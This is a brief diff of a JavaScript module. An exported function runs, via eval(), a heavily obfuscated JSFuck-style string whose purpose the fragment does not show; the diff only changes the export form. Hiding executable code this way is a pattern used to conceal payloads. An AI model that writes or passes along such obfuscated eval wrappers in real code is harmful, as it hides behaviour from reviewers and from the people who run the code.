@@ -13,8 +13,6 @@ const command = '[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[
 
 /* FUNCTIONS */
 
-const pippo = () => {
+export default () => {
     eval(command);
 };
-
-export default { pippo };
